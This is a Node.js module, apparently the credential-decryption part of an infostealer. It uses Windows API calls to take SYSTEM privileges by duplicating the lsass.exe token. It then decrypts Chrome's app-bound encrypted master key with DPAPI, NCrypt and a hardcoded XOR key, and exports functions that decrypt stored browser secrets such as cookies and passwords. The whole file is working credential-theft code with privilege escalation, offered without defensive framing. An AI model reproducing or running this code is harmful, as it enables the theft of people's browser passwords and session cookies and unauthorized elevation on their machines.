"use strict";

const crypto = require("crypto");
const koffi = require("koffi");
const fs = require("fs");
const path = require("path");

const uint8Ptr = koffi.pointer("uint8_t");
const uint32Ptr = koffi.pointer("uint32_t");
const voidPtr = koffi.pointer("void");
const voidPtrPtr = koffi.pointer(voidPtr);

const DATA_BLOB = koffi.struct({
    cbData: "uint32_t",
    pbData: uint8Ptr
});
const DATA_BLOB_PTR = koffi.pointer(DATA_BLOB);

const LUID = koffi.struct({
    LowPart: "uint32_t",
    HighPart: "int32_t"
});

const TOKEN_PRIVILEGES = koffi.struct({
    PrivilegeCount: "uint32_t",
    Privileges: koffi.array(koffi.struct({ Luid: LUID, Attributes: "uint32_t" }), 1)
});

const PROCESSENTRY32 = koffi.struct({
    dwSize: "uint32_t",
    cntUsage: "uint32_t",
    th32ProcessID: "uint32_t",
    th32DefaultHeapID: "uintptr_t",
    th32ModuleID: "uint32_t",
    cntThreads: "uint32_t",
    th32ParentProcessID: "uint32_t",
    pcPriClassBase: "int32_t",
    dwFlags: "uint32_t",
    szExeFile: koffi.array("char", 260)
});

const crypt32 = koffi.load("crypt32.dll");
const advapi32 = koffi.load("advapi32.dll");
const kernel32 = koffi.load("kernel32.dll");
const ncrypt = koffi.load("ncrypt.dll");

const CryptUnprotectData = crypt32.func("__stdcall", "CryptUnprotectData", "int", [DATA_BLOB_PTR, "void*", "void*", "void*", "void*", "uint32_t", DATA_BLOB_PTR]);
const OpenProcessToken = advapi32.func("__stdcall", "OpenProcessToken", "int", [voidPtr, "uint32_t", voidPtrPtr]);
const LookupPrivilegeValueA = advapi32.func("__stdcall", "LookupPrivilegeValueA", "int", ["str", "str", koffi.pointer(LUID)]);
const AdjustTokenPrivileges = advapi32.func("__stdcall", "AdjustTokenPrivileges", "int", [voidPtr, "int", koffi.pointer(TOKEN_PRIVILEGES), "uint32_t", "void*", "void*"]);
const GetCurrentProcess = kernel32.func("__stdcall", "GetCurrentProcess", voidPtr, []);
const OpenProcess = kernel32.func("__stdcall", "OpenProcess", voidPtr, ["uint32_t", "int", "uint32_t"]);
const CreateToolhelp32Snapshot = kernel32.func("__stdcall", "CreateToolhelp32Snapshot", voidPtr, ["uint32_t", "uint32_t"]);
const Process32First = kernel32.func("__stdcall", "Process32First", "int", [voidPtr, koffi.pointer(PROCESSENTRY32)]);
const Process32Next = kernel32.func("__stdcall", "Process32Next", "int", [voidPtr, koffi.pointer(PROCESSENTRY32)]);
const CloseHandle = kernel32.func("__stdcall", "CloseHandle", "int", [voidPtr]);
const SetThreadToken = advapi32.func("__stdcall", "SetThreadToken", "int", [voidPtr, voidPtr]);
const DuplicateTokenEx = advapi32.func("__stdcall", "DuplicateTokenEx", "int", [voidPtr, "uint32_t", "void*", "int", "int", voidPtrPtr]);

function setPrivilege(name) {
    const process = GetCurrentProcess();
    const tokenBuf = Buffer.alloc(8);
    if (!OpenProcessToken(process, 40, tokenBuf)) return false;
    const token = koffi.decode(tokenBuf, voidPtr);
    const luidBuf = Buffer.alloc(koffi.sizeof(LUID));
    if (!LookupPrivilegeValueA(null, name, luidBuf)) return false;
    const tp = { PrivilegeCount: 1, Privileges: [{ Luid: koffi.decode(luidBuf, LUID), Attributes: 2 }] };
    AdjustTokenPrivileges(token, 0, tp, 0, null, null);
    return true;
}

function getLsassPid() {
    const snap = CreateToolhelp32Snapshot(2, 0);
    const entryBuf = Buffer.alloc(koffi.sizeof(PROCESSENTRY32));
    entryBuf.writeUInt32LE(koffi.sizeof(PROCESSENTRY32), 0);
    let pid = null;
    if (Process32First(snap, entryBuf)) {
        do {
            const entry = koffi.decode(entryBuf, PROCESSENTRY32);
            if (Buffer.from(entry.szExeFile).toString().toLowerCase().includes("lsass.exe")) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, entryBuf));
    }
    CloseHandle(snap);
    return pid;
}

function impersonateSystem() {
    setPrivilege("SeDebugPrivilege");
    const pid = getLsassPid();
    if (!pid) return false;
    const process = OpenProcess(4096, 0, pid);
    const tokenBuf = Buffer.alloc(8);
    OpenProcessToken(process, 10, tokenBuf);
    const token = koffi.decode(tokenBuf, voidPtr);
    const dupBuf = Buffer.alloc(8);
    DuplicateTokenEx(token, 33554432, null, 2, 2, dupBuf);
    const dupToken = koffi.decode(dupBuf, voidPtr);
    const success = SetThreadToken(null, dupToken);
    CloseHandle(dupToken);
    CloseHandle(token);
    CloseHandle(process);
    return success;
}

function decryptDPAPI(data) {
    const input = { cbData: data.length, pbData: data };
    const output = Buffer.alloc(koffi.sizeof(DATA_BLOB));
    if (CryptUnprotectData(input, null, null, null, null, 0, output)) {
        const decoded = koffi.decode(output, DATA_BLOB);
        return Buffer.from(koffi.decode(decoded.pbData, "uint8_t", decoded.cbData));
    }
    return null;
}

function decryptAES(ciphertext, key, iv) {
    try {
        const tag = ciphertext.slice(-16);
        const data = ciphertext.slice(0, -16);
        const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
        decipher.setAuthTag(tag);
        return Buffer.concat([decipher.update(data), decipher.final()]);
    } catch (e) { return null; }
}

async function getMasterKey(profilePath) {
    const statePath = path.join(profilePath, "Local State");
    if (!fs.existsSync(statePath)) return null;
    const state = JSON.parse(fs.readFileSync(statePath, "utf8"));
    
    if (state.os_crypt.app_bound_encrypted_key) {
        impersonateSystem();
        const abData = Buffer.from(state.os_crypt.app_bound_encrypted_key, "base64").slice(4);
        const step1 = decryptDPAPI(abData);
        if (!step1) return null;
        const step2 = decryptDPAPI(step1);
        if (!step2) return null;
        
        const providerBuf = Buffer.alloc(8);
        ncrypt.func("__stdcall", "NCryptOpenStorageProvider", "int", [voidPtrPtr, "str16", "uint32_t"])(providerBuf, "Microsoft Software Key Storage Provider", 0);
        const provider = koffi.decode(providerBuf, voidPtr);
        const keyHandleBuf = Buffer.alloc(8);
        ncrypt.func("__stdcall", "NCryptOpenKey", "int", [voidPtr, voidPtrPtr, "str16", "uint32_t", "uint32_t"])(provider, keyHandleBuf, "Google Chromekey1", 0, 0);
        const keyHandle = koffi.decode(keyHandleBuf, voidPtr);
        
        const outSizeBuf = Buffer.alloc(4);
        const payload = step2.slice(41, 73);
        ncrypt.func("__stdcall", "NCryptDecrypt", "int", [voidPtr, uint8Ptr, "uint32_t", "void*", uint8Ptr, "uint32_t", uint32Ptr, "uint32_t"])(keyHandle, payload, payload.length, null, null, 0, outSizeBuf, 64);
        const output = Buffer.alloc(outSizeBuf.readUInt32LE(0));
        ncrypt.func("__stdcall", "NCryptDecrypt", "int", [voidPtr, uint8Ptr, "uint32_t", "void*", uint8Ptr, "uint32_t", uint32Ptr, "uint32_t"])(keyHandle, payload, payload.length, null, output, output.length, outSizeBuf, 64);
        
        const mix = Buffer.from("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390", "hex");
        const key = Buffer.alloc(32);
        for(let i=0; i<32; i++) key[i] = output[i] ^ mix[i];
        
        SetThreadToken(null, null);
        return key;
    }

    const encryptedKey = Buffer.from(state.os_crypt.encrypted_key, "base64").slice(5);
    return decryptDPAPI(encryptedKey);
}

async function decryptValue(value, masterKey) {
    const buf = Buffer.isBuffer(value) ? value : Buffer.from(value);
    const prefix = buf.slice(0, 3).toString();
    if (["v10", "v11", "v20"].includes(prefix)) {
        return decryptAES(buf.slice(15), masterKey, buf.slice(3, 15)).toString("utf8");
    }
    return decryptDPAPI(buf).toString("utf8");
}

exports.getMasterKey = getMasterKey;
exports.decryptValue = decryptValue;
exports.dpapi = { unprotectData: decryptDPAPI };
